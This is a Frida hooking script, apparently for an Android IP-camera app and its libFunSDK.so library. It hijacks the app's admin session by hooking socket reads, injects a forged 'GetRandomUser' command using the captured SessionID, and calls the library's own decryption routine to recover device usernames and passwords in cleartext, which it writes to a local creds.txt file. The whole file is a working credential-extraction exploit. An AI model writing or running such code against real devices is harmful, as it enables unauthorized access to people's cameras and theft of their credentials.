/*
 * zz-createuser.js — na sessão admin do app (ao abrir f5332/9a07), injeta
 * GetRandomUser (1660), pega o Info do retorno e decifra NA HORA com
 * Fun_DecDevRandomUserInfo(SN,Info,out) -> user/senha em claro (files/creds.txt).
 */
(function () {
  var OUT = "/data/data/com.cz.czeye/files/creds.txt", LIB = "libFunSDK.so";
  function save(l){ console.log("[cu] "+l.substring(0,180)); try{var f=new File(OUT,"a");f.write(l+"\n");f.flush();f.close();}catch(e){} }
  save("LOADING createuser");
  var SNS = ["SN_CAMERA_1","SN_CAMERA_2","SN_CAMERA_3"];
  var done = {}, decd = {};
  var sendFn = null, decFn = null;
  try {
    var sp = Module.findExportByName("libc.so","send") || Module.findExportByName(null,"send");
    sendFn = new NativeFunction(sp,"int",["int","pointer","size_t","int"]);
    var da = Module.findExportByName(LIB,"_Z24Fun_DecDevRandomUserInfoPKcS0_Pc");
    decFn = new NativeFunction(da,"int",["pointer","pointer","pointer"]);
    save("send="+sp+" dec="+da);
  } catch(e){ save("ERRO init: "+e); }

  function frame(json, sid, msgid, seq){
    var body=[]; for(var i=0;i<json.length;i++) body.push(json.charCodeAt(i)&0xff); body.push(0);
    var n=body.length;
    var h=[0xFF,1,0,0, sid&0xff,(sid>>8)&0xff,(sid>>16)&0xff,(sid>>24)&0xff,
           seq&0xff,(seq>>8)&0xff,(seq>>16)&0xff,(seq>>24)&0xff,0,0,
           msgid&0xff,(msgid>>8)&0xff, n&0xff,(n>>8)&0xff,(n>>16)&0xff,(n>>24)&0xff];
    var all=h.concat(body); var buf=Memory.alloc(all.length); buf.writeByteArray(all); return {ptr:buf,len:all.length};
  }
  function scan(buf,n){ try{var m=n>4096?4096:n; var b=buf.readByteArray(m); if(!b)return null; var u=new Uint8Array(b),s=""; for(var i=0;i<u.length;i++)s+=String.fromCharCode(u[i]); return s;}catch(e){return null;} }

  function decrypt(info){
    SNS.forEach(function(sn){
      try{
        var out=Memory.alloc(512); out.writeByteArray(new Array(512).fill(0));
        var r=decFn(Memory.allocUtf8String(sn), Memory.allocUtf8String(info), out);
        var s=null; try{s=out.readUtf8String();}catch(e){}
        if(r===0 && s && /p1:|p2:/.test(s)) save("CREDS SN="+sn+" ret="+r+"  "+s);
      }catch(e){}
    });
  }

  function onRead(fd,buf,n){
    if(n<20||n>262144) return;
    var s=scan(buf,n); if(!s) return;  // scan limitado aos 1os 4KB (controle fica no início)
    if(s.indexOf("AliveInterval")>=0 && s.indexOf("SessionID")>=0 && !done[fd]){
      var m=s.match(/"SessionID"\s*:\s*"?(0x[0-9a-fA-F]+)"?/);
      if(m && sendFn){ done[fd]=1;
        var sidNum=parseInt(m[1],16);
        var f=frame('{"Name":"GetRandomUser","SessionID":"'+m[1]+'"}', sidNum, 1660, 600);
        var r=sendFn(fd,f.ptr,f.len,0);
        save("INJETADO GetRandomUser fd="+fd+" SID="+m[1]+" ret="+r);
      }
    }
    var mi=s.match(/"Info"\s*:\s*"([A-Za-z0-9+/=]+)"/);
    if(mi && !decd[mi[1]]){ decd[mi[1]]=1; save("INFO capturado: "+mi[1]); decrypt(mi[1]); }
  }
  var hk=[];
  ["read","recv","recvfrom"].forEach(function(nm){
    var p=Module.findExportByName("libc.so",nm)||Module.findExportByName(null,nm); if(!p) return;
    try{ Interceptor.attach(p,{onEnter:function(a){this.fd=a[0].toInt32();this.buf=a[1];},onLeave:function(r){onRead(this.fd,this.buf,r.toInt32());}}); hk.push(nm); }catch(e){}
  });
  save("ARMED createuser (hooks: "+hk.join(",")+") — abra f5332/9a07 no app");
})();
